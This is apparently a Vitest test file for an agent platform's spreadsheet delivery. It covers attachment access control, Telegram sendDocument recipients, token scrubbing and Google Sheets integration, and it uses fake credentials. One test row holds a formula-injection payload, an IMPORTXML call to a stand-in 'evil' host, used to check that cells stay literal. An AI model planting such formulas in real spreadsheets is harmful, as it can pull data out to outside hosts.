import { createVerify, generateKeyPairSync } from 'node:crypto';
import type { AddressInfo } from 'node:net';
import { fileURLToPath } from 'node:url';
import { MAX_INSTRUCTIONS } from '@hornhoof/protocol';
import { and, eq } from 'drizzle-orm';
import Fastify from 'fastify';
import { describe, expect, it, onTestFinished } from 'vitest';
import { HIDDEN } from '../src/db/agent-sql.js';
import { agentEvents, agents, companies, departments, jobs, people, personAccess, subscriptions, telegramReplies } from '../src/db/schema.js';
import { orchestratorSteady, renderInstructions } from '../src/modules/agents/instructions.js';
import { hashToken } from '../src/crypto/tokens.js';
import { ask, createTask } from '../src/modules/tasks/engine.js';
import { sendDocument, TelegramError } from '../src/modules/telegram/api.js';
import { CORE_SKILLS, loadTemplates } from '../src/modules/templates/load.js';
import { listenAt } from '../../../test-support/ports.mjs';
import { fakeTelegram, type TelegramUser } from './fake-telegram.js';
import { as, connectNode, invitePerson, listen, mcp, nextOf, setUpCompany, testApp, until } from './helpers.js';

const NODE_KEY = 'k'.repeat(40);
const BOT_TOKEN = '123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsawQ';
const TEMPLATES_DIR = fileURLToPath(new URL('../../../templates', import.meta.url));
const CEO_TG: TelegramUser = { id: 7770001, first_name: 'Ivan', username: 'ivan_ceo', language_code: 'ru' };
const MKT_TG: TelegramUser = { id: 7770002, first_name: 'Luiza', username: 'luiza_mkt', language_code: 'ru' };
const SALES_TG: TelegramUser = { id: 7770003, first_name: 'Sam', username: 'sam_sales', language_code: 'en' };

type ToolReply = { content: { type: string; text: string }[]; isError?: boolean };

const SAMPLE_XLSX = Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00, 0x08, 0x00, 0x61, 0x62, 0x63, 0x64]);
const SAMPLE_CSV = Buffer.from('Name,Email\r\nAda,ada@example.com\r\n', 'utf8');

async function fakeGoogle() {
  const { privateKey, publicKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
  const pem = privateKey.export({ type: 'pkcs8', format: 'pem' }).toString();
  const tokenCalls: { assertion: string; grantType: string }[] = [];
  const createdSheets: Record<string, unknown>[] = [];
  const sharedPermissions: { fileId: string; auth: string; body: Record<string, unknown> }[] = [];

  const app = Fastify({ forceCloseConnections: true });
  app.addContentTypeParser('application/x-www-form-urlencoded', { parseAs: 'string' }, (_req, body, done) => done(null, body));

  app.post('/token', async (req, reply) => {
    const params = new URLSearchParams(String(req.body ?? ''));
    const grantType = params.get('grant_type') ?? '';
    const assertion = params.get('assertion') ?? '';
    tokenCalls.push({ assertion, grantType });
    const parts = assertion.split('.');
    if (parts.length !== 3) return reply.code(400).send({ error: 'invalid_grant' });
    const verify = createVerify('RSA-SHA256');
    verify.update(`${parts[0]}.${parts[1]}`);
    verify.end();
    const ok = verify.verify(publicKey, Buffer.from(parts[2]!, 'base64url'));
    if (!ok) return reply.code(401).send({ error: 'invalid_signature' });
    return { access_token: 'ya29.fake-google-token-secret', expires_in: 3600, token_type: 'Bearer' };
  });

  app.post('/v4/spreadsheets', async (req, reply) => {
    if (req.headers.authorization !== 'Bearer ya29.fake-google-token-secret') {
      return reply.code(401).send({ error: { message: 'Unauthenticated' } });
    }
    const body = (req.body ?? {}) as Record<string, unknown>;
    createdSheets.push(body);
    const id = `sheet-${createdSheets.length}`;
    return {
      spreadsheetId: id,
      spreadsheetUrl: `https://docs.google.com/spreadsheets/d/${id}/edit`,
    };
  });

  app.post<{ Params: { id: string } }>('/drive/v3/files/:id/permissions', async (req, reply) => {
    sharedPermissions.push({
      fileId: req.params.id,
      auth: String(req.headers.authorization ?? ''),
      body: (req.body ?? {}) as Record<string, unknown>,
    });
    return reply.code(200).send({ id: 'perm-1' });
  });

  await listenAt(port => app.listen({ host: '127.0.0.1', port }));
  const base = `http://127.0.0.1:${(app.server.address() as AddressInfo).port}`;
  onTestFinished(() => app.close());

  const serviceAccountJson = JSON.stringify({
    type: 'service_account',
    project_id: 'acme-sheets',
    private_key_id: 'keyid9876',
    private_key: pem,
    client_email: 'sheets-bot@acme-sheets.iam.gserviceaccount.com',
  });

  return { base, serviceAccountJson, tokenCalls, createdSheets, sharedPermissions };
}

async function marketingCompany(extraEnv: NodeJS.ProcessEnv = {}) {
  const tg = await fakeTelegram();
  tg.bots.set(BOT_TOKEN, { id: 123456789, username: 'acme_mkt_bot', first_name: 'Marketing Bot' });
  const { app, db } = await testApp({ NODE_KEY, TELEGRAM_API_URL: tg.url, ...extraEnv });
  const wsUrl = await listen(app);
  const ceoSession = await setUpCompany(app);
  const node = await connectNode(wsUrl, NODE_KEY);
  node.send({ type: 'hello', version: '0.5.0', loggedIn: true, running: [], terminals: true });
  await until(async () => (await app.inject({ url: '/api/agents/orchestrator/events', ...as(ceoSession) })).json().state.ready);

  const [acme] = await db.select().from(companies);
  const companyId = acme!.id;
  const [ceo] = await db.select().from(people).where(eq(people.isOwner, true));
  const [sub] = await db.select().from(subscriptions);
  const [mkt, sales] = await db
    .insert(departments)
    .values([
      { companyId, templateKey: 'marketing', roleCode: 'MKT', position: 1 },
      { companyId, templateKey: 'sales', roleCode: 'SAL', position: 2 },
    ])
    .returning();

  const [mktHead, mktSeo, salesWorker] = await db
    .insert(agents)
    .values([
      { companyId, kind: 'head', name: 'Mira', roleKey: 'MKT-HEAD', departmentId: mkt!.id, model: '', subscriptionId: sub!.id },
      { companyId, kind: 'worker', name: 'Nora', roleKey: 'MKT-SEO', departmentId: mkt!.id, model: '', subscriptionId: sub!.id },
      { companyId, kind: 'worker', name: 'Sammy', roleKey: 'SAL-AE', departmentId: sales!.id, model: '', subscriptionId: sub!.id },
    ])
    .returning();

  const luizaSession = await invitePerson(app, ceoSession, { name: 'Luiza', email: 'luiza@acme.test', access: { departments: [mkt!.id] } });
  const samSession = await invitePerson(app, ceoSession, { name: 'Sam', email: 'sam@acme.test', access: { departments: [sales!.id] } });
  const [luiza] = await db.select().from(people).where(eq(people.email, 'luiza@acme.test'));
  const [sam] = await db.select().from(people).where(eq(people.email, 'sam@acme.test'));

  await db.update(people).set({ telegramUsername: 'ivan_ceo', telegramUserId: CEO_TG.id }).where(eq(people.id, ceo!.id));
  await db.update(people).set({ telegramUsername: 'luiza_mkt', telegramUserId: MKT_TG.id }).where(eq(people.id, luiza!.id));
  await db.update(people).set({ telegramUsername: 'sam_sales', telegramUserId: SALES_TG.id }).where(eq(people.id, sam!.id));

  expect((await app.inject({ method: 'PUT', url: `/api/agents/${mktHead!.id}/telegram`, payload: { token: BOT_TOKEN }, ...as(ceoSession) })).statusCode).toBe(200);

  const task = (
    await createTask(app.ctx, { agentId: mktHead!.id }, {
      title: 'Собрать контакты партнеров в таблицу',
      brief: 'Выдать таблицу контактов',
      body: 'Собери контакты и отдай таблицей.',
      departmentId: mkt!.id,
      assigneeAgentId: mktSeo!.id,
      executor: true,
    })
  ).task;

  let seq = 0;
  const startTurn = async (agentId: string) => {
    const token = `turn-tool-token-${++seq}-0123456789abcdef`;
    const [job] = await db
      .insert(jobs)
      .values({
        companyId,
        subscriptionId: sub!.id,
        agentId,
        kind: 'conversation',
        prompt: 'deliver spreadsheet',
        timeoutMs: 900_000,
        status: 'running',
        startedAt: new Date(),
        toolTokenHash: hashToken(token),
      })
      .returning();
    return { token, job: job! };
  };

  return {
    tg,
    app,
    db,
    node,
    companyId,
    ceo: ceo!,
    ceoSession,
    luiza: luiza!,
    luizaSession,
    sam: sam!,
    samSession,
    mkt: mkt!,
    sales: sales!,
    mktHead: mktHead!,
    mktSeo: mktSeo!,
    salesWorker: salesWorker!,
    task,
    startTurn,
  };
}

describe('1a. task and chat .xlsx/.csv attachments and strict download boundaries', () => {
  it('attaches .xlsx and .csv to a task and to chat, records chat file events, serves 1-click downloads, and blocks unauthorized viewers', async () => {
    const c = await marketingCompany();
    const { token, job } = await c.startTurn(c.mktSeo.id);

    /* Attach .xlsx to both the task and the chat reply. */
    const upBoth = await c.app.inject({
      method: 'POST',
      url: `/api/attachments?task=${c.task.number}&chat=1&name=${encodeURIComponent('контакты партнеров.xlsx')}`,
      payload: SAMPLE_XLSX,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${token}` },
    });
    expect(upBoth.statusCode).toBe(201);
    const xlsxId = upBoth.json().id as string;
    expect(upBoth.json().name).toBe('контакты партнеров.xlsx');

    /* Attach .csv directly to chat without a task. */
    const upChatCsv = await c.app.inject({
      method: 'POST',
      url: `/api/attachments?chat=1&name=leads.csv`,
      payload: SAMPLE_CSV,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${token}` },
    });
    expect(upChatCsv.statusCode).toBe(201);
    const csvId = upChatCsv.json().id as string;

    /* Chat events hold the attached files as downloadable file entries. */
    const events = await c.db.select().from(agentEvents).where(eq(agentEvents.jobId, job.id));
    const attachedIds = events.flatMap(e => ((e.data as { pictures?: { id: string; name: string; file?: boolean }[] }).pictures ?? []));
    expect(attachedIds).toEqual([
      { id: xlsxId, name: 'контакты партнеров.xlsx', file: true },
      { id: csvId, name: 'leads.csv', file: true },
    ]);

    /* Authorized viewers (CEO and Marketing member Luiza) download both files with Content-Disposition: attachment. */
    for (const session of [c.ceoSession, c.luizaSession]) {
      const gotXlsx = await c.app.inject({ url: `/api/attachments/${xlsxId}`, ...as(session) });
      expect(gotXlsx.statusCode).toBe(200);
      expect(gotXlsx.headers['content-disposition']).toContain("attachment; filename*=UTF-8''");
      expect(decodeURIComponent(String(gotXlsx.headers['content-disposition']).split("''")[1]!)).toBe('контакты партнеров.xlsx');
      expect(Buffer.compare(gotXlsx.rawPayload, SAMPLE_XLSX)).toBe(0);

      const gotCsv = await c.app.inject({ url: `/api/attachments/${csvId}`, ...as(session) });
      expect(gotCsv.statusCode).toBe(200);
      expect(gotCsv.headers['content-disposition']).toContain("attachment; filename*=UTF-8''leads.csv");
      expect(Buffer.compare(gotCsv.rawPayload, SAMPLE_CSV)).toBe(0);
    }

    /* Sales-only viewer Sam gets 404 for both Marketing's task file and Marketing's chat file. */
    expect((await c.app.inject({ url: `/api/attachments/${xlsxId}`, ...as(c.samSession) })).statusCode).toBe(404);
    expect((await c.app.inject({ url: `/api/attachments/${csvId}`, ...as(c.samSession) })).statusCode).toBe(404);

    /* Chat file cannot be misused as an ask_person screenshot, and unbound ask_person PNG stays 404 until bound. */
    await expect(ask(c.app.ctx, c.mktSeo.id, c.task.id, { kind: 'question', text: 'Pick?', images: [csvId] })).rejects.toThrow();
    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3, 4]);
    const unboundPng = await c.app.inject({
      method: 'POST',
      url: '/api/attachments',
      payload: png,
      headers: { 'content-type': 'image/png', authorization: `Bearer ${token}` },
    });
    expect(unboundPng.statusCode).toBe(201);
    expect((await c.app.inject({ url: `/api/attachments/${unboundPng.json().id as string}`, ...as(c.ceoSession) })).statusCode).toBe(404);
  });
});

describe('1b. Telegram sendDocument delivery and recipient access boundaries', () => {
  it('sends documents through sendDocument and scrubs bot tokens from Telegram errors', async () => {
    const tg = await fakeTelegram();
    tg.bots.set(BOT_TOKEN, { id: 123456789, username: 'doc_bot', first_name: 'Doc Bot' });
    await sendDocument(tg.url, BOT_TOKEN, CEO_TG.id, { bytes: SAMPLE_XLSX, name: 'contacts.xlsx' }, 'Готовая таблица');
    expect(tg.sentDocuments).toHaveLength(1);
    expect(tg.sentDocuments[0]).toMatchObject({
      token: BOT_TOKEN,
      chat_id: CEO_TG.id,
      file_name: 'contacts.xlsx',
      caption: 'Готовая таблица',
    });
    expect(Buffer.compare(tg.sentDocuments[0]!.bytes, SAMPLE_XLSX)).toBe(0);

    tg.blocked.add(999999);
    let caught: unknown;
    try {
      await sendDocument(tg.url, BOT_TOKEN, 999999, { bytes: SAMPLE_XLSX, name: 'contacts.xlsx' });
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(TelegramError);
    expect((caught as Error).message).not.toContain(BOT_TOKEN);
    expect((caught as Error).message).toContain('[token]');
  });

  it('delivers chat-attached files via Telegram sendDocument only to the turn author and drops delivery if access is revoked', async () => {
    const c = await marketingCompany();

    /* CEO asks Marketing Head in Telegram for a spreadsheet. */
    c.tg.write(BOT_TOKEN, CEO_TG, 'Пришли контакты файлом xlsx');
    const first = await nextOf(c.node, 'job.run');
    const token = first.toolToken ?? '';
    expect(token.length).toBeGreaterThan(10);
    c.node.send({ type: 'job.started', jobId: first.jobId });
    await until(async () => (await c.db.select().from(telegramReplies)).length === 1);

    const attached = await c.app.inject({
      method: 'POST',
      url: `/api/attachments?chat=1&name=contacts.xlsx`,
      payload: SAMPLE_XLSX,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${token}` },
    });
    expect(attached.statusCode).toBe(201);
    c.node.send({ type: 'job.event', jobId: first.jobId, seq: 0, event: { kind: 'text', text: 'Отправляю таблицу контактов.' } });

    await until(() => c.tg.sentDocuments.filter(d => d.chat_id === CEO_TG.id).length === 1);
    await until(() => c.tg.sent.filter(s => s.chat_id === CEO_TG.id).length === 1);
    expect(c.tg.sentDocuments.filter(d => d.chat_id === MKT_TG.id)).toHaveLength(0);
    expect(c.tg.sentDocuments[0]!.file_name).toBe('contacts.xlsx');
    expect(Buffer.compare(c.tg.sentDocuments[0]!.bytes, SAMPLE_XLSX)).toBe(0);
    c.node.send({ type: 'job.done', jobId: first.jobId, ok: true, sessionId: 's1', result: '', tail: '', error: null });
    await until(() => c.node.acks.includes(first.jobId));

    /* Luiza writes to Marketing Head, then her Marketing access is revoked before the agent replies with a file: she gets nothing. */
    c.tg.write(BOT_TOKEN, MKT_TG, 'Пришли и мне таблицу');
    const second = await nextOf(c.node, 'job.run');
    const secondToken = second.toolToken ?? '';
    c.node.send({ type: 'job.started', jobId: second.jobId });
    await until(async () => (await c.db.select().from(telegramReplies).where(eq(telegramReplies.chatId, MKT_TG.id))).length === 1);

    /* Move Luiza's access from Marketing to Sales only before the agent sends the file. */
    await c.db.delete(personAccess).where(and(eq(personAccess.personId, c.luiza.id), eq(personAccess.departmentId, c.mkt.id)));
    await c.db.insert(personAccess).values({ companyId: c.companyId, personId: c.luiza.id, departmentId: c.sales.id });

    await c.app.inject({
      method: 'POST',
      url: `/api/attachments?chat=1&name=secret-mkt.xlsx`,
      payload: SAMPLE_XLSX,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${secondToken}` },
    });
    c.node.send({ type: 'job.event', jobId: second.jobId, seq: 0, event: { kind: 'text', text: 'Секретный отчет.' } });
    await until(async () => (await c.db.select().from(telegramReplies).where(eq(telegramReplies.chatId, MKT_TG.id))).length === 0);
    expect(c.tg.sentDocuments.filter(d => d.chat_id === MKT_TG.id)).toHaveLength(0);
    expect(c.tg.sent.filter(s => s.chat_id === MKT_TG.id)).toHaveLength(0);
  });

  it('lets a Marketing worker without its own bot send a task .xlsx via send_telegram_file only to people allowed to see it', async () => {
    const c = await marketingCompany();
    const { token } = await c.startTurn(c.mktSeo.id);
    const up = await c.app.inject({
      method: 'POST',
      url: `/api/attachments?task=${c.task.number}&name=partner-contacts.xlsx`,
      payload: SAMPLE_XLSX,
      headers: { 'content-type': 'application/octet-stream', authorization: `Bearer ${token}` },
    });
    const attachmentId = up.json().id as string;
    const client = await mcp(c.app, token);

    /* Authorized CEO receives the file via the Marketing department bot. */
    const sentOk = (await client.callTool({
      name: 'send_telegram_file',
      arguments: { person: c.ceo.id, attachment: attachmentId, caption: 'Контакты партнеров' },
    })) as ToolReply;
    expect(sentOk.isError).toBeFalsy();
    expect(c.tg.sentDocuments).toHaveLength(1);
    expect(c.tg.sentDocuments[0]).toMatchObject({
      chat_id: CEO_TG.id,
      file_name: 'partner-contacts.xlsx',
      caption: 'Контакты партнеров',
    });

    /* Unauthorized Sales-only Sam is refused and receives zero Telegram documents. */
    const refused = (await client.callTool({
      name: 'send_telegram_file',
      arguments: { person: c.sam.id, attachment: attachmentId },
    })) as ToolReply;
    expect(refused.isError).toBe(true);
    expect(c.tg.sentDocuments).toHaveLength(1);
  });
});

describe('1c. Google Sheets integration and clear .xlsx fallback when Google is not connected', () => {
  it('saves Google Sheets credentials only for whole-company admins, hides google_sheets from agent SQL, creates sheets, and instructs .xlsx fallback when disconnected', async () => {
    const google = await fakeGoogle();
    const c = await marketingCompany({
      GOOGLE_TOKEN_URL: `${google.base}/token`,
      GOOGLE_SHEETS_URL: google.base,
      GOOGLE_DRIVE_URL: google.base,
    });

    expect(HIDDEN).toContain('google_sheets');

    /* Department-only people cannot read or change company Google Sheets settings. */
    expect((await c.app.inject({ url: '/api/google-sheets', ...as(c.luizaSession) })).statusCode).toBe(403);
    expect(
      (
        await c.app.inject({
          method: 'PUT',
          url: '/api/google-sheets',
          payload: { credentials: google.serviceAccountJson },
          ...as(c.luizaSession),
        })
      ).statusCode,
    ).toBe(403);

    /* Before Google is connected, create_google_sheet tells the Marketing agent what to connect and requires immediate .xlsx fallback. */
    const { token } = await c.startTurn(c.mktSeo.id);
    const client = await mcp(c.app, token);
    const fallback = (await client.callTool({
      name: 'create_google_sheet',
      arguments: {
        title: 'Partner Contacts',
        sheets: [{ name: 'Contacts', headers: ['Company', 'Email'], rows: [['North LLC', 'hi@north.test']] }],
      },
    })) as ToolReply;
    expect(fallback.isError).toBeFalsy();
    const fallbackData = JSON.parse(fallback.content[0]!.text) as { connected: boolean; setup: string; fallback: string };
    expect(fallbackData.connected).toBe(false);
    expect(fallbackData.setup).toContain('Company settings');
    expect(fallbackData.fallback).toContain('hh-xlsx');
    expect(fallbackData.fallback).toContain('hh-attach');

    /* CEO connects Google Sheets in Company settings; raw private key is never returned. */
    const saved = await c.app.inject({
      method: 'PUT',
      url: '/api/google-sheets',
      payload: { credentials: google.serviceAccountJson, shareEmail: 'ivan@acme.test' },
      ...as(c.ceoSession),
    });
    expect(saved.statusCode).toBe(200);
    expect(saved.body).not.toContain('BEGIN PRIVATE KEY');
    expect(saved.json()).toEqual({
      google: {
        kind: 'service_account',
        account: 'sheets-bot@acme-sheets.iam.gserviceaccount.com',
        shareEmail: 'ivan@acme.test',
        keyLast4: '9876',
      },
    });

    /* Updating shareEmail without re-sending credentials keeps the encrypted key. */
    const updated = await c.app.inject({
      method: 'PUT',
      url: '/api/google-sheets',
      payload: { shareEmail: 'ceo@acme.test' },
      ...as(c.ceoSession),
    });
    expect(updated.statusCode).toBe(200);
    expect(updated.json().google.shareEmail).toBe('ceo@acme.test');

    /* Connected create_google_sheet creates a populated workbook with literal cells (no formula injection) and shares with shareEmail. */
    const created = (await client.callTool({
      name: 'create_google_sheet',
      arguments: {
        title: 'Контакты партнеров 2026',
        sheets: [
          {
            name: 'Партнеры',
            headers: ['Компания', 'Почта', 'Сделок', 'Формула'],
            rows: [['Север', 'info@sever.test', 5, '=IMPORTXML("http://evil","//a")']],
          },
        ],
      },
    })) as ToolReply;
    expect(created.isError).toBeFalsy();
    const createdData = JSON.parse(created.content[0]!.text) as { connected: boolean; spreadsheetId: string; url: string };
    expect(createdData).toMatchObject({
      connected: true,
      spreadsheetId: 'sheet-1',
      url: 'https://docs.google.com/spreadsheets/d/sheet-1/edit',
    });
    expect(google.tokenCalls).toHaveLength(1);
    expect(google.createdSheets).toHaveLength(1);
    expect(JSON.stringify(google.createdSheets[0])).toContain('"stringValue":"=IMPORTXML(\\"http://evil\\",\\"//a\\")"');
    expect(JSON.stringify(google.createdSheets[0])).not.toContain('formulaValue');
    expect(google.sharedPermissions).toEqual([
      {
        fileId: 'sheet-1',
        auth: 'Bearer ya29.fake-google-token-secret',
        body: { type: 'user', role: 'writer', emailAddress: 'ceo@acme.test' },
      },
    ]);

    /* Deleting disconnects Google Sheets. */
    expect((await c.app.inject({ method: 'DELETE', url: '/api/google-sheets', ...as(c.ceoSession) })).statusCode).toBe(204);
    expect((await c.app.inject({ url: '/api/google-sheets', ...as(c.ceoSession) })).json()).toEqual({ google: null });
  });
});

describe('2. shared hh-* table-delivery skills and role instruction limits', () => {
  it('includes hh-tables in CORE_SKILLS and ORCHESTRATOR_SKILLS, forbids refusing spreadsheet delivery, and keeps DEV-HEAD within limits', () => {
    const templates = loadTemplates(TEMPLATES_DIR);
    expect(CORE_SKILLS).toContain('hh-tables');
    const skill = templates.skills.get('hh-tables');
    expect(skill).toBeDefined();
    expect(skill!.title.en.length).toBeGreaterThan(3);
    expect(skill!.title.ru.length).toBeGreaterThan(3);
    expect(skill!.description.en.length).toBeGreaterThan(10);
    expect(skill!.description.ru.length).toBeGreaterThan(10);
    expect(skill!.body).toContain('hh-xlsx');
    expect(skill!.body).toContain('hh-attach');
    expect(skill!.body).toContain('send_telegram_file');
    expect(skill!.body).toContain('create_google_sheet');
    expect(skill!.body).toMatch(/error/i);
    expect(skill!.body).toMatch(/no such capability|cannot generate files/i);
    expect(skill!.body).not.toMatch(/ArSpatially|Ivan|David/i);
    expect(skill!.body).not.toContain('\u2014');
    expect(`${skill!.title.ru} ${skill!.description.ru}`).not.toContain('ё');
    expect(`${skill!.title.ru} ${skill!.description.ru}`).not.toContain('\u2014');

    const place = { company: 'Acme', department: 'Development', product: null };
    for (const roleId of ['DEV-HEAD', 'MKT-HEAD', 'MKT-SEO']) {
      const role = templates.roles.get(roleId)!;
      const rendered = renderInstructions(
        templates,
        {
          id: 'a1',
          companyId: 'c1',
          kind: role.kind === 'head' ? 'head' : 'worker',
          name: 'Agent',
          roleKey: role.id,
          skills: role.skills.filter(s => s.on).map(s => s.id),
          overrides: {},
          templateHashes: {},
        } as Parameters<typeof renderInstructions>[1],
        place,
      );
      expect(rendered.whole).toContain('<!-- hh:skill hh-tables -->');
      expect(rendered.text.length).toBeLessThanOrEqual(MAX_INSTRUCTIONS);
      expect(rendered.whole.length).toBeLessThanOrEqual(MAX_INSTRUCTIONS);
    }
    expect(orchestratorSteady(templates).whole).toContain('<!-- hh:skill hh-tables -->');
  });
});
